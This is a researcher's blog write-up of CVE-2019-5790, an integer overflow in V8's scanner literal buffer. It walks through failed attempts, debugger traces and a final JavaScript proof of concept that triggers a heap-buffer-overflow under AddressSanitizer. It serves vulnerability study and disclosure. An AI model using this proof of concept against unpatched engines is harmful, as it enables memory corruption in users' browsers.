# [V8] CVE-2019-5790

This blogpost is an analysis of vulnerability reported by Dimitry Fourny from Blue Frost Security which was already fixed in repository but no poc has been released yet. It got me curious how the poc would look like for this bug so I started my research on the bug. I described the way I approached this bug with all the steps, also non-working tries.

https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop_12.html?m=1
https://access.redhat.com/security/cve/cve-2019-5790

Patch : https://github.com/v8/v8/commit/c7410e8ccff855fdb1a1a0a0c6c2690716a96548

## Bug

```cpp
int Scanner::LiteralBuffer::NewCapacity(int min_capacity) {
  int capacity = Max(min_capacity, backing_store_.length());
  int new_capacity = Min(capacity * kGrowthFactory, capacity + kMaxGrowth);
  return new_capacity;
}

void Scanner::LiteralBuffer::ExpandBuffer() {
  Vector<byte> new_store = Vector<byte>::New(NewCapacity(kInitialCapacity));
  MemCopy(new_store.start(), backing_store_.start(), position_);
  backing_store_.Dispose();
  backing_store_ = new_store;
}
```

``` Scanner::LiteralBuffer::NewCapacity ``` 
Is responsible for calculation of size that need to be allocated on the heap for the incoming string.
It takes value ```min_capacity``` which is 16 and checks it against the ```backing_store_.length()``` which is the size of the string in question.
Value ```kMaxGrowth``` equals 1MB = 1048576;

Basic idea of the allocation is like this:
```"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" = 64 chars, so allocation would be 256.```

Now all we need is to overflow allocation however there is tricky part because to overflow it we need max_int +1 (2147483648 + 1), so there are two choices to do that :

* create file with variable name that is max_int+1 = 2GB file
* create dynamic string and the eval it so engine would need to parse it

## Method 1:
My attempt is to create file with this command:
```python -c "print('var '+'a'*134217729+' = 1')" > poc2.js```


CTRL+C during execution:
```
#0  0x000055555559a189 in (anonymous namespace)::(anonymous namespace)::CheckLTImpl<unsigned long, unsigned long> (lhs=37441044, rhs=37748736, msg=0x7ffff5f97060 "index < length_") at ../../src/base/logging.h:301
#1  0x00007ffff62dabbf in (anonymous namespace)::(anonymous namespace)::Vector<unsigned char const>::operator[] (this=0x7fffffffc380, index=37441044) at ../../src/vector.h:61
#2  0x00007ffff700698f in (anonymous namespace)::(anonymous namespace)::Scanner::LiteralBuffer::AddOneByteChar (this=0x7fffffffc380, one_byte_char=97 'a') at ../../src/parsing/scanner.h:486
#3  0x00007ffff7006cd4 in (anonymous namespace)::(anonymous namespace)::Scanner::LiteralBuffer::AddChar (this=0x7fffffffc380, code_unit=97 'a') at ../../src/parsing/scanner.h:425
#4  0x00007ffff70055fb in (anonymous namespace)::(anonymous namespace)::Scanner::AddLiteralChar (this=0x7fffffffc350, c=97 'a') at ../../src/parsing/scanner.h:577
#5  0x00007ffff7006c5d in operator() (this=0x7fffffffb360, c0=97) at ../../src/parsing/scanner-inl.h:273
#6  0x00007ffff7006b99 in operator() (this=0x7fffffffb388, raw_c0_=97) at ../../src/parsing/scanner.h:77
#7  0x00007ffff7006abe in (anonymous namespace)::(anonymous namespace)::find_if<const unsigned short *, (lambda at ../../src/parsing/scanner.h:75:53)> (__first=0x555555694972, __last=0x555555694d42, __pred=...) at ../../buildtools/third_party/libc++/trunk/include/algorithm:878
#8  (anonymous namespace)::(anonymous namespace)::Utf16CharacterStream::AdvanceUntil<(lambda at ../../src/parsing/scanner-inl.h:259:20)>(class {...}) (this=0x555555694910, check=...) at ../../src/parsing/scanner.h:75
#9  0x00007ffff7006a30 in (anonymous namespace)::(anonymous namespace)::Scanner::AdvanceUntil<(lambda at ../../src/parsing/scanner-inl.h:259:20)>(class {...}) (this=0x7fffffffc350, check=...) at ../../src/parsing/scanner.h:599
#10 0x00007ffff7005093 in (anonymous namespace)::(anonymous namespace)::Scanner::ScanIdentifierOrKeywordInner (this=0x7fffffffc350) at ../../src/parsing/scanner-inl.h:259
#11 0x00007ffff700685e in (anonymous namespace)::(anonymous namespace)::Scanner::ScanIdentifierOrKeyword (this=0x7fffffffc350) at ../../src/parsing/scanner-inl.h:180
#12 0x00007ffff7006454 in (anonymous namespace)::(anonymous namespace)::Scanner::ScanSingleToken (this=0x7fffffffc350) at ../../src/parsing/scanner-inl.h:490
``` 
It looks I am hitting the right code, so next step is too make breakpoint at point ```br scanner.cc:70``` and check the value for ```new_capacity``` and it goes like this :
```
[1] = 64
[2] = 256
[3] = 1024
[4] = 4096
[5] = 16384
[6] = 65536
[7] = 262144
[8] = 1048576 - we are hitting here "kMaxGrowth"
[9] = 2097152
[10] = 3145728
[11] = 4194304
[12] = 5242880
[...]
[158] = 158334976
[159] = 159383552
[160] = 160432128
[161] = 161480704
```
So based on this my assumption was wrong that it always is multiplied by 4.

### Backtrace 
```
Continuing.
$new_capacity =  135266304

Thread 1 "d8" hit Breakpoint 1, (anonymous namespace)::(anonymous namespace)::Scanner::LiteralBuffer::NewCapacity (this=0x7fffffffc380, min_capacity=16) at ../../src/parsing/scanner.cc:70
70        return new_capacity;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────
 RAX  0x8100000
 RBX  0x0
 RCX  0x8000000
 RDX  0x8000000
 RDI  0x20000000
 RSI  0x20000000
 R8   0x8000000
 R9   0x0
 R10  0x7fffe7b1bfd0 ◂— 0x6161616161616161 ('aaaaaaaa')
 R11  0x207
 R12  0x7fffffffd1f8 —▸ 0x5555556a4e30 —▸ 0x400aa88a1a9 ◂— 0x300003db415e808
 R13  0x7fffffffe540 ◂— 0x2
 R14  0x0
 R15  0x0
 RBP  0x7fffffffb210 —▸ 0x7fffffffb250 —▸ 0x7fffffffb280 —▸ 0x7fffffffb2b0 —▸ 0x7fffffffb2d0 ◂— ...
 RSP  0x7fffffffb1f0 —▸ 0x7fffffffb210 —▸ 0x7fffffffb250 —▸ 0x7fffffffb280 —▸ 0x7fffffffb2b0 ◂— ...
 RIP  0x7ffff6fffd54 (v8::internal::Scanner::LiteralBuffer::NewCapacity(int)+68) ◂— mov    eax, dword ptr [rbp - 0x14]
──────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────
 ► 0x7ffff6fffd54 <v8::internal::Scanner::LiteralBuffer::NewCapacity(int)+68>    mov    eax, dword ptr [rbp - 0x14]
   0x7ffff6fffd57 <v8::internal::Scanner::LiteralBuffer::NewCapacity(int)+71>    add    rsp, 0x20
   0x7ffff6fffd5b <v8::internal::Scanner::LiteralBuffer::NewCapacity(int)+75>    pop    rbp
   0x7ffff6fffd5c <v8::internal::Scanner::LiteralBuffer::NewCapacity(int)+76>    ret
    ↓
   0x7ffff6fffd7e <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+30>      mov    edi, eax
   0x7ffff6fffd80 <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+32>      call   0x7ffff7ccd680

   0x7ffff6fffd85 <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+37>      mov    qword ptr [rbp - 0x18], rax
   0x7ffff6fffd89 <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+41>      mov    qword ptr [rbp - 0x10], rdx
   0x7ffff6fffd8d <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+45>      lea    rdi, [rbp - 0x18]
   0x7ffff6fffd91 <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+49>      call   0x7ffff7c68300

   0x7ffff6fffd96 <v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+54>      mov    rdi, qword ptr [rbp - 0x20]
──────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────
In file: /home/mtowalski/v8/v8/src/parsing/scanner.cc
   65 }
   66
   67 int Scanner::LiteralBuffer::NewCapacity(int min_capacity) {
   68   int capacity = Max(min_capacity, backing_store_.length());
   69   int new_capacity = Min(capacity * kGrowthFactory, capacity + kMaxGrowth);
 ► 70   return new_capacity;
   71 }
   72
   73 void Scanner::LiteralBuffer::ExpandBuffer() {
   74   Vector<byte> new_store = Vector<byte>::New(NewCapacity(kInitialCapacity));
   75   MemCopy(new_store.start(), backing_store_.start(), position_);
──────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffb1f0 —▸ 0x7fffffffb210 —▸ 0x7fffffffb250 —▸ 0x7fffffffb280 —▸ 0x7fffffffb2b0 ◂— ...
01:0008│      0x7fffffffb1f8 ◂— 0x810000000000010
02:0010│      0x7fffffffb200 ◂— 0x1008000000
03:0018│      0x7fffffffb208 —▸ 0x7fffffffc380 —▸ 0x7fffe771e010 ◂— 0x6161616161616161 ('aaaaaaaa')
04:0020│ rbp  0x7fffffffb210 —▸ 0x7fffffffb250 —▸ 0x7fffffffb280 —▸ 0x7fffffffb2b0 —▸ 0x7fffffffb2d0 ◂— ...
05:0028│      0x7fffffffb218 —▸ 0x7ffff6fffd7e (v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+30) ◂— mov    edi, eax
06:0030│      0x7fffffffb220 —▸ 0x7fffffffb240 —▸ 0x7fffffffc380 —▸ 0x7fffe771e010 ◂— 0x6161616161616161 ('aaaaaaaa')
07:0038│      0x7fffffffb228 —▸ 0x7fffe771e010 ◂— 0x6161616161616161 ('aaaaaaaa')
────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► f 0     7ffff6fffd54 v8::internal::Scanner::LiteralBuffer::NewCapacity(int)+68
   f 1     7ffff6fffd7e v8::internal::Scanner::LiteralBuffer::ExpandBuffer()+30
   f 2     7ffff7006979
   f 3     7ffff7006cd4 v8::internal::Scanner::LiteralBuffer::AddChar(char)+100
   f 4     7ffff70055fb v8::internal::Scanner::AddLiteralChar(char)+43
   f 5     7ffff7006c5d
   f 6     7ffff7006b99
   f 7     7ffff7006abe
   f 8     7ffff7006abe
   f 9     7ffff7006a30
   f 10     7ffff7005093 v8::internal::Scanner::ScanIdentifierOrKeywordInner()+355
Breakpoint scanner.cc:70
pwndbg> c
Continuing.
[Thread 0x7ffff1722700 (LWP 18914) exited]
[Thread 0x7fffeff1f700 (LWP 18917) exited]
[Thread 0x7ffff0720700 (LWP 18916) exited]
[Thread 0x7ffff0f21700 (LWP 18915) exited]
[Thread 0x7ffff1f23700 (LWP 18913) exited]
[Thread 0x7ffff2724700 (LWP 18912) exited]
[Thread 0x7ffff2f25700 (LWP 18911) exited]
[Thread 0x7ffff3726700 (LWP 18910) exited]
[Inferior 1 (process 18904) exited normally]


```

Based on this pattern the ```new_capacity``` would be assigned max_int after many iterations (
At line 8 we hit ```kMaxGrowth``` and from that point it is not multiplication by 4 but from now it is addition of ```1048576```.

By this method I tried to allocate ```(max_int) - 1048576 +1``` so I would receive ```max_int in new_capacity``` 
It crashed with this backtrace
```
#0  (anonymous namespace)::(anonymous namespace)::OS::Abort () at ../../src/base/platform/platform-posix.cc:400
#1  0x00007ffff626fa0f in (anonymous namespace)::Utils::ReportApiFailure (location=0x7ffff5fee698 "v8::ToLocalChecked", message=0x7ffff5fa30c0 "Empty MaybeLocal.") at ../../src/api.cc:467
#2  0x00007ffff62bf1df in (anonymous namespace)::Utils::ApiCheck (condition=false, location=0x7ffff5fee698 "v8::ToLocalChecked", message=0x7ffff5fa30c0 "Empty MaybeLocal.") at ../../src/api.h:135
#3  0x00007ffff6273a5d in (anonymous namespace)::V8::ToLocalEmpty () at ../../src/api.cc:1055
#4  0x0000555555596261 in (anonymous namespace)::MaybeLocal<v8::String>::ToLocalChecked (this=0x7fffffffd0f8) at ../../include/v8.h:9458
#5  0x00005555555b440d in (anonymous namespace)::Shell::ReadFile (isolate=0x5555556113b0, name=0x7fffffffe7bd "poc2.js") at ../../src/d8.cc:2236
#6  0x00005555555c2761 in (anonymous namespace)::SourceGroup::ReadFile (this=0x55555560a028, isolate=0x5555556113b0, name=0x7fffffffe7bd "poc2.js") at ../../src/d8.cc:2479
#7  0x00005555555c25da in (anonymous namespace)::SourceGroup::Execute (this=0x55555560a028, isolate=0x5555556113b0) at ../../src/d8.cc:2460
#8  0x00005555555c685f in (anonymous namespace)::Shell::RunMain (isolate=0x5555556113b0, argc=2, argv=0x7fffffffe548, last_run=true) at ../../src/d8.cc:2948
#9  0x00005555555c8d84 in (anonymous namespace)::Shell::Main (argc=2, argv=0x7fffffffe548) at ../../src/d8.cc:3500
#10 0x00005555555c9292 in main (argc=2, argv=0x7fffffffe548) at ../../src/d8.cc:3535
#11 0x00007ffff4aa62e1 in __libc_start_main (main=0x5555555c9270 <main(int, char**)>, argc=2, argv=0x7fffffffe548, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe538) at ../csu/libc-start.c:291
#12 0x000055555559402a in _start ()
```


## Method 2:
```js

function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}
var len_str = 2147483648;
var name_function = repeatStringNumTimes("\u0151",len_str);
console.log(name_function.length);
eval("var "+name_function+" = new Function('return');");
```
This approach will crash the engine before reaching the vulnerable code because of addition of string is too big.

So after learning new stuff from "Method 1" I decieded to try to allocate string of length ```2146435073```

During this experiment it crashed like this:

### Backtrace 
```
$2517 = 66060288
Length is 65273856
$2519 = 64
[.....]
$2588 = 66060288
$2589 = 67108864
pwndbg>
<--- Last few GCs --->

[23783:0x5555556113b0]   419195 ms: Mark-sweep 2036.3 (2039.3) -> 2036.3 (2039.3) MB, 154.7 / 0.0 ms  (average mu = 0.951, current mu = 0.001) last resort GC in old space requested
[23783:0x5555556113b0]   419364 ms: Mark-sweep 2036.3 (2039.3) -> 2036.3 (2039.3) MB, 169.6 / 0.1 ms  (average mu = 0.900, current mu = 0.000) last resort GC in old space requested


<--- JS stacktrace --->

==== JS stack trace =========================================

    0: ExitFrame [pc: 0x7ffff79e678d]
    1: StubFrame [pc: 0x7ffff7b3bbac]
Security context: 0x3c1eaab973b1 <JSObject>
    2: /* anonymous */ [0x3c1eaab9bd11] [test.js:4] [bytecode=0x3c1eaab9bbd1 offset=141](this=0x1de80ad809f9 <JSGlobal Object>)
    3: InternalFrame [pc: 0x7ffff76d8680]
    4: EntryFrame [pc: 0x7ffff76d840d]

==== Details ================================================

[0]: ExitFrame [pc: 0x7ffff79e678d]
[1]: StubFram...


#
# Fatal javascript OOM in CALL_AND_RETRY_LAST
#


Thread 1 "d8" received signal SIGILL, Illegal instruction.
(anonymous namespace)::(anonymous namespace)::OS::Abort () at ../../src/base/platform/platform-posix.cc:400
400         V8_IMMEDIATE_CRASH();
bt
#0  (anonymous namespace)::(anonymous namespace)::OS::Abort () at ../../src/base/platform/platform-posix.cc:400
#1  0x00007ffff626f95b in (anonymous namespace)::Utils::ReportOOMFailure (isolate=0x5555556113b0, location=0x7ffff5ff8cad "CALL_AND_RETRY_LAST", is_heap_oom=true) at ../../src/api.cc:484
#2  0x00007ffff626f8c6 in (anonymous namespace)::(anonymous namespace)::V8::FatalProcessOutOfMemory (isolate=0x5555556113b0, location=0x7ffff5ff8cad "CALL_AND_RETRY_LAST", is_heap_oom=true) at ../../src/api.cc:452
#3  0x00007ffff6b43e3a in (anonymous namespace)::(anonymous namespace)::Heap::FatalProcessOutOfMemory (this=0x55555561a1a8, location=0x7ffff5ff8cad "CALL_AND_RETRY_LAST") at ../../src/heap/heap.cc:4872
#4  0x00007ffff6b51f8b in (anonymous namespace)::(anonymous namespace)::Heap::AllocateRawWithRetryOrFail (this=0x55555561a1a8, size=66322448, space=(anonymous namespace)::(anonymous namespace)::OLD_SPACE, alignment=(anonymous namespace)::(anonymous namespace)::kWordAligned) at ../../src/heap/heap.cc:4310
#5  0x00007ffff6aea7be in (anonymous namespace)::(anonymous namespace)::Factory::AllocateRawWithImmortalMap (this=0x5555556113b0, size=66322448, pretenure=(anonymous namespace)::(anonymous namespace)::TENURED, map=..., alignment=(anonymous namespace)::(anonymous namespace)::kWordAligned) at ../../src/heap/factory.cc:128
#6  0x00007ffff6af161c in (anonymous namespace)::(anonymous namespace)::Factory::AllocateRawOneByteInternalizedString (this=0x5555556113b0, length=66322432, hash_field=265289730) at ../../src/heap/factory.cc:835
#7  0x00007ffff6af2099 in (anonymous namespace)::(anonymous namespace)::Factory::NewOneByteInternalizedString (this=0x5555556113b0, str=..., hash_field=265289730) at ../../src/heap/factory.cc:921
#8  0x00007ffff6369e0f in (anonymous namespace)::(anonymous namespace)::AstRawStringInternalizationKey::AsHandle (this=0x7fffffffb0c0, isolate=0x5555556113b0) at ../../src/ast/ast-value-factory.cc:71
#9  0x00007ffff6e6dd97 in (anonymous namespace)::(anonymous namespace)::StringTable::AddKeyNoResize (isolate=0x5555556113b0, key=0x7fffffffb0c0) at ../../src/objects.cc:17460
#10 0x00007ffff6e6d5c0 in (anonymous namespace)::(anonymous namespace)::StringTable::LookupKey (isolate=0x5555556113b0, key=0x7fffffffb0c0) at ../../src/objects.cc:17452
#11 0x00007ffff6361990 in (anonymous namespace)::(anonymous namespace)::AstRawString::Internalize (this=0x5555557b5838, isolate=0x5555556113b0) at ../../src/ast/ast-value-factory.cc:88
#12 0x00007ffff6367bb5 in (anonymous namespace)::(anonymous namespace)::AstValueFactory::Internalize (this=0x5555556fbdd0, isolate=0x5555556113b0) at ../../src/ast/ast-value-factory.cc:274
#13 0x00007ffff64d2f52 in (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::GenerateUnoptimizedCodeForToplevel (isolate=0x5555556113b0, parse_info=0x7fffffffbbb8, allocator=0x55555560feb0, is_compiled_scope=0x7fffffffc398) at ../../src/compiler.cc:505
#14 0x00007ffff64cb964 in (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::CompileToplevel (parse_info=0x7fffffffbbb8, isolate=0x5555556113b0, is_compiled_scope=0x7fffffffc398) at ../../src/compiler.cc:934
#15 0x00007ffff64cc37d in (anonymous namespace)::(anonymous namespace)::Compiler::GetFunctionFromEval (source=..., outer_info=..., context=..., language_mode=(anonymous namespace)::(anonymous namespace)::LanguageMode::kSloppy, restriction=(anonymous namespace)::(anonymous namespace)::NO_PARSE_RESTRICTION, parameters_end_pos=-1, eval_scope_position=0, eval_position=124) at ../../src/compiler.cc:1393
#16 0x00007ffff7100172 in (anonymous namespace)::(anonymous namespace)::CompileGlobalEval((anonymous namespace)::(anonymous namespace)::Isolate *, (anonymous namespace)::(anonymous namespace)::Handle<v8::internal::String>, (anonymous namespace)::(anonymous namespace)::Handle<v8::internal::SharedFunctionInfo>, enum class (anonymous namespace)::(anonymous namespace)::LanguageMode, int, int) (isolate=0x5555556113b0, source=..., outer_info=..., language_mode=(anonymous namespace)::(anonymous namespace)::LanguageMode::kSloppy, eval_scope_position=0, eval_position=124) at ../../src/runtime/runtime-compiler.cc:322
#17 0x00007ffff70ff2ef in (anonymous namespace)::(anonymous namespace)::__RT_impl_Runtime_ResolvePossiblyDirectEval (args=..., isolate=0x5555556113b0) at ../../src/runtime/runtime-compiler.cc:353
#18 0x00007ffff70feca2 in (anonymous namespace)::(anonymous namespace)::Runtime_ResolvePossiblyDirectEval (args_length=6, args_object=0x7fffffffc7d0, isolate=0x5555556113b0) at ../../src/runtime/runtime-compiler.cc:331

```
### Different ideas to allocate big string

My next ideas was check correct size for max String in v8. ( I know that I could find it in code but I decided to do it JS style).
### 1.
```
var name_function = "a".repeat(262144);
for(var i=0;i<2146435073;i+=1048576){
        name_function += 'x'.repeat(1048576)
        eval("var "+name_function+" = new Function('return');");
        console.log("Length is "+name_function.length.toString());
}
```
With "slightly" bigger first_value.
```
var first_value = 169869312;
var name_function = "a".repeat(first_value);
for(var i=first_value;i<2146435073;i+=1048576){
        name_function += 'x'.repeat(1048576)
        eval("var "+name_function+" = new Function('return');");
        console.log("Length is "+name_function.length.toString());
}
```

### 2.
```
final_size = 0xffffffff;
cur_size = 0;
var name_function = "";
while (cur_size < final_size){
        name_function+="a";
        cur_size+=1;
}
console.log("Length is "+name_function.length.toString());
eval("var "+name_function+" = new Function('return');");

```

Based on those failed attempts I decided to change the approach and add everything step by step.
That idea lead to this poc and this one crashed it "good way" :)

## Final poc:
```js
var first_value = 159383552;
var name_function = "a".repeat(first_value);
name_function += "a".repeat(first_value);
name_function += "a".repeat(first_value);
name_function += "a".repeat(first_value);
name_function += "a".repeat(first_value);
name_function += "a".repeat(first_value);
console.log("Length is "+name_function.length.toString());
eval("var "+name_function+" = new Function('return');");
console.log("Length is "+name_function.length.toString());
```

### Backtrace debug:
```
#0  (anonymous namespace)::(anonymous namespace)::OS::Abort () at ../../src/base/platform/platform-posix.cc:400
#1  0x00007ffff626f95b in (anonymous namespace)::Utils::ReportOOMFailure (isolate=0x5555556113b0, location=0x7ffff5f7e91f "NewArray", is_heap_oom=false) at ../../src/api.cc:484
#2  0x00007ffff626f8c6 in (anonymous namespace)::(anonymous namespace)::V8::FatalProcessOutOfMemory (isolate=0x5555556113b0, location=0x7ffff5f7e91f "NewArray", is_heap_oom=false) at ../../src/api.cc:452
#3  0x00007ffff626f4ef in (anonymous namespace)::(anonymous namespace)::FatalProcessOutOfMemory (isolate=0x0, location=0x7ffff5f7e91f "NewArray") at ../../src/api.cc:357
#4  0x00007ffff62627a8 in (anonymous namespace)::(anonymous namespace)::NewArray<char> (size=18446744071562067968) at ../../src/allocation.h:45
#5  0x00007ffff6d6cca4 in (anonymous namespace)::(anonymous namespace)::Vector<unsigned char>::New (length=-2147483648) at ../../src/vector.h:33
#6  0x00007ffff6fffd85 in (anonymous namespace)::(anonymous namespace)::Scanner::LiteralBuffer::ExpandBuffer (this=0x7fffffffb4b0) at ../../src/parsing/scanner.cc:74
#7  0x00007ffff7006979 in (anonymous namespace)::(anonymous namespace)::Scanner::LiteralBuffer::AddOneByteChar (this=0x7fffffffb4b0, one_byte_char=97 'a') at ../../src/parsing/scanner.h:485
#8  0x00007ffff7006cd4 in (anonymous namespace)::(anonymous namespace)::Scanner::LiteralBuffer::AddChar (this=0x7fffffffb4b0, code_unit=97 'a') at ../../src/parsing/scanner.h:425
#9  0x00007ffff70055fb in (anonymous namespace)::(anonymous namespace)::Scanner::AddLiteralChar (this=0x7fffffffb480, c=97 'a') at ../../src/parsing/scanner.h:577
#10 0x00007ffff7006c5d in operator() (this=0x7fffffffa490, c0=97) at ../../src/parsing/scanner-inl.h:273
#11 0x00007ffff7006b99 in operator() (this=0x7fffffffa4b8, raw_c0_=97) at ../../src/parsing/scanner.h:77
#12 0x00007ffff7006abe in (anonymous namespace)::(anonymous namespace)::find_if<const unsigned short *, (lambda at ../../src/parsing/scanner.h:75:53)> (__first=0x5555556c8e1a, __last=0x5555556c9212, __pred=...) at ../../buildtools/third_party/libc++/trunk/include/algorithm:878
#13 (anonymous namespace)::(anonymous namespace)::Utf16CharacterStream::AdvanceUntil<(lambda at ../../src/parsing/scanner-inl.h:259:20)>(class {...}) (this=0x5555556c8de0, check=...) at ../../src/parsing/scanner.h:75
#14 0x00007ffff7006a30 in (anonymous namespace)::(anonymous namespace)::Scanner::AdvanceUntil<(lambda at ../../src/parsing/scanner-inl.h:259:20)>(class {...}) (this=0x7fffffffb480, check=...) at ../../src/parsing/scanner.h:599
#15 0x00007ffff7005093 in (anonymous namespace)::(anonymous namespace)::Scanner::ScanIdentifierOrKeywordInner (this=0x7fffffffb480) at ../../src/parsing/scanner-inl.h:259
#16 0x00007ffff700685e in (anonymous namespace)::(anonymous namespace)::Scanner::ScanIdentifierOrKeyword (this=0x7fffffffb480) at ../../src/parsing/scanner-inl.h:180
#17 0x00007ffff7006454 in (anonymous namespace)::(anonymous namespace)::Scanner::ScanSingleToken (this=0x7fffffffb480) at ../../src/parsing/scanner-inl.h:490
#18 0x00007ffff7004668 in (anonymous namespace)::(anonymous namespace)::Scanner::Scan (this=0x7fffffffb480, next_desc=0x7fffffffb4a8) at ../../src/parsing/scanner-inl.h:515
#19 0x00007ffff700074a in (anonymous namespace)::(anonymous namespace)::Scanner::Next (this=0x7fffffffb480) at ../../src/parsing/scanner.cc:230
#20 0x00007ffff6fa0697 in (anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::Consume (this=0x7fffffffb340, token=(anonymous namespace)::(anonymous namespace)::Token::VAR) at ../../src/parsing/parser-base.h:738
#21 0x00007ffff6fbf193 in (anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::ParseVariableDeclarations (this=0x7fffffffb340, var_context=(anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::kStatementListItem, parsing_result=0x7fffffffab50) at ../../src/parsing/parser-base.h:3418
#22 0x00007ffff6fa1044 in (anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::ParseVariableStatement (this=0x7fffffffb340, var_context=(anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::kStatementListItem, names=0x0) at ../../src/parsing/parser-base.h:4673
#23 0x00007ffff6f9fb90 in (anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::ParseStatementListItem (this=0x7fffffffb340) at ../../src/parsing/parser-base.h:4471
#24 0x00007ffff6f9d65d in (anonymous namespace)::(anonymous namespace)::ParserBase<v8::internal::Parser>::ParseStatementList (this=0x7fffffffb340, body=0x7fffffffad98, end_token=(anonymous namespace)::(anonymous namespace)::Token::EOS) at ../../src/parsing/parser-base.h:4436
#25 0x00007ffff6f899d5 in (anonymous namespace)::(anonymous namespace)::Parser::DoParseProgram (this=0x7fffffffb340, isolate=0x5555556113b0, info=0x7fffffffbbb8) at ../../src/parsing/parser.cc:578
#26 0x00007ffff6f88d3d in (anonymous namespace)::(anonymous namespace)::Parser::ParseProgram (this=0x7fffffffb340, isolate=0x5555556113b0, info=0x7fffffffbbb8) at ../../src/parsing/parser.cc:497
#27 0x00007ffff6fc8421 in (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ParseProgram (info=0x7fffffffbbb8, isolate=0x5555556113b0) at ../../src/parsing/parsing.cc:39
#28 0x00007ffff64cb754 in (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::CompileToplevel (parse_info=0x7fffffffbbb8, isolate=0x5555556113b0, is_compiled_scope=0x7fffffffc398) at ../../src/compiler.cc:919
#29 0x00007ffff64cc37d in (anonymous namespace)::(anonymous namespace)::Compiler::GetFunctionFromEval (source=..., outer_info=..., context=..., language_mode=(anonymous namespace)::(anonymous namespace)::LanguageMode::kSloppy, restriction=(anonymous namespace)::(anonymous namespace)::NO_PARSE_RESTRICTION, parameters_end_pos=-1, eval_scope_position=0, eval_position=740) at ../../src/compiler.cc:1393
#30 0x00007ffff7100172 in (anonymous namespace)::(anonymous namespace)::CompileGlobalEval((anonymous namespace)::(anonymous namespace)::Isolate *, (anonymous namespace)::(anonymous namespace)::Handle<v8::internal::String>, (anonymous namespace)::(anonymous namespace)::Handle<v8::internal::SharedFunctionInfo>, enum class (anonymous namespace)::(anonymous namespace)::LanguageMode, int, int) (isolate=0x5555556113b0, source=..., outer_info=..., language_mode=(anonymous namespace)::(anonymous namespace)::LanguageMode::kSloppy, eval_scope_position=0, eval_position=740) at ../../src/runtime/runtime-compiler.cc:322
#31 0x00007ffff70ff2ef in (anonymous namespace)::(anonymous namespace)::__RT_impl_Runtime_ResolvePossiblyDirectEval (args=..., isolate=0x5555556113b0) at ../../src/runtime/runtime-compiler.cc:353
#32 0x00007ffff70feca2 in (anonymous namespace)::(anonymous namespace)::Runtime_ResolvePossiblyDirectEval (args_length=6, args_object=0x7fffffffc7c8, isolate=0x5555556113b0) at ../../src/runtime/runtime-compiler.cc:331
#33 0x00007ffff79e678d in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit () from /home/mtowalski/v8/v8/out/x64.debug/./libv8.so
#34 0x00007ffff7b3bbac in Builtins_CallRuntimeHandler () from /home/mtowalski/v8/v8/out/x64.debug/./libv8.so
#35 0x00007fffffffc768 in ?? ()
#36 0x00007fffffffc768 in ?? ()
#37 0x00007fffffffc810 in ?? ()
#38 0x0000555555653210 in ?? ()
#39 0x0000000000000018 in ?? ()
#40 0x00007fffffffc810 in ?? ()
#41 0x00007ffff76e3008 in Builtins_InterpreterEntryTrampoline () from /home/mtowalski/v8/v8/out/x64.debug/./libv8.so
#42 0x000002e400000000 in ?? ()
#43 0x0000000000000000 in ?? ()

```
### Asan release with symbolize:
```
=================================================================
==3074==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x606000001bc0 at pc 0x559891d264ae bp 0x7ffd115efbe0 sp 0x7ffd115ef390
WRITE of size 536870913 at 0x606000001bc0 thread T0
    #0 0x559891d264ad in __asan_memcpy _asan_rtl_:3
    #1 0x7f470051633c in v8::internal::MemCopy(void*, void const*, unsigned long) /home/mtowalski/v8/v8/out/x64.release/../../src/memcopy.h:91:3
    #2 0x7f470051633c in v8::internal::Scanner::LiteralBuffer::ExpandBuffer() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.cc:75:0
    #3 0x7f4700530763 in v8::internal::Scanner::LiteralBuffer::AddOneByteChar(unsigned char) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:485:49
    #4 0x7f4700530763 in v8::internal::Scanner::LiteralBuffer::AddChar(char) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:425:0
    #5 0x7f4700530763 in v8::internal::Scanner::AddLiteralChar(char) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:577:0
    #6 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)::operator()(int) const /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:273:0
